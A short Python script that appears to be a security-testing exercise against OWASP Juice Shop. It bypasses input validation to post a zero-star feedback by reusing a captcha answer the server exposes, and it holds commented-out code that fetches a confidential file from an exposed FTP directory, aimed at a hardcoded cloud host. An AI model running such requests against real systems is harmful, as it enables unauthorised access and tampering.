import requests
from pprint import pprint


def req(url: str, json: dict = None) -> dict:
    if json is not None:
        print(f"POST {url}")
        pprint(json)
        resp = requests.post(url=url, json=json)
    else:
        print(f"GET {url}")
        resp = requests.get(url=url)
    print(f"Response: {resp.status_code}")
    try:
        if resp.headers['Content-Type'].startswith('application/json'):
            resp = resp.json()
            pprint(resp)
        elif resp.headers['Content-Type'].startswith('text'):
            resp = resp.content.decode('ascii')
            print(resp)
        return resp
    except Exception as e:
        print(e)


def zero_star(host):
    captcha = req(url=f"{host}/rest/captcha/")
    req(
        url=f"{host}/api/Feedbacks/",
        json={

            "captchaId": captcha['captchaId'],
            "captcha": captcha['answer'],
            "comment": "Zero star test",
            "rating": 0
        }
    )


def confidential_document(host):
    req(url=f"{host}/ftp/acquisitions.md")


if __name__ == '__main__':
    vulnerable_host = "http://ec2-34-215-113-110.us-west-2.compute.amazonaws.com"
    secure_host = "http://localhost"

    print()
    print("=========== Zero Star ==========>")
    print("----> INSECURE")
    zero_star(vulnerable_host)
    print()

    print("----> SECURE")
    zero_star(secure_host)
    print("<=================================")

    # print()
    # print("===== Confidential Documents ====>")
    # print()
    # confidential_document(vulnerable_host)
    # print("<=================================")